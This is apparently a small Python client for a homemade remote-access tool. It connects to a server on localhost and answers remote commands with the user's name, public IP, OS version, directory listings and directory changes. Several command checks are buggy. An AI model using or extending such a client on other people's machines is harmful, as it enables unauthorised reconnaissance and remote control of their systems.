import os
import platform
import socket
from getpass import getuser
from requests import get as r_get

class ClientSetup:
    def __init__(self, server:str, port:int, client_ip:str):
        self.in_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server = server
        self.port = port
        self.client_ip = client_ip
        self.connect_to_server()
    

    def convert_byte(data:str):
        return bytes(data, "UTF-8")


    def connect_to_server(self):
        print(self.client_ip)
        try:
            self.in_socket.connect((self.server, self.port))
        except ConnectionRefusedError:
            print("Server down")
            os._exit(1)
        except OverflowError or OSError:
            print(f"Client Configuration is incorrect! Is {self.port} a valid port?")
            os._exit(1)

        while True:
            cmd = self.in_socket.recv(1024).decode("UTF-8")

            if cmd == "TEST":
                self.in_socket.send(ClientSetup.convert_byte("CONNECTED"))

            elif cmd == "GETUSER".lower():
                user = getuser()
                self.in_socket.send(ClientSetup.convert_byte(f"Username: {user}"))

            elif cmd == "GETIP".lower():
                self.in_socket.send(ClientSetup.convert_byte(f"IP: {self.client_ip}"))
            
            elif cmd == "GETOS".lower():
                OS_INFO = platform.system() + " " + platform.version()
                self.in_socket.send(ClientSetup.convert_byte(f"OS: {OS_INFO}"))
            
            elif cmd == "LISTDIR":
                dir_files = os.listdir()
                dir_files = str(dir_files)
                self.in_socket.send(ClientSetup.convert_byte(f"{dir_files}"))

            elif cmd == "PWD":
                get_path = os.getcwd()
                self.in_socket.send(ClientSetup.convert_byte(f"{get_path}"))

            elif str(cmd).startswith("CD"):
                print(cmd)
                dir_path = str(cmd[2:]).replace("-", " ")
                print(dir_path)
                try:
                    os.chdir(dir_path)
                    msg = "Changed to " + os.getcwd()
                except OSError or ValueError as e:
                    msg = f"Invalid Path Was Given"
                self.in_socket.send(ClientSetup.convert_byte(f"{msg}"))

            elif cmd == "CLOSE".lower():
                self.in_socket.close()
                break
            else:
                self.in_socket.send(ClientSetup.convert_byte("Invalid Command"))
                continue
            


if __name__ == "__main__":
    try:
        client_ip = r_get("https://icanhazip.com").text.replace("\n", "")
    except:
        client_ip = "IP: ??"
    
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 3334
    ClientSetup(server=SERVER_IP, port=SERVER_PORT, client_ip=client_ip)
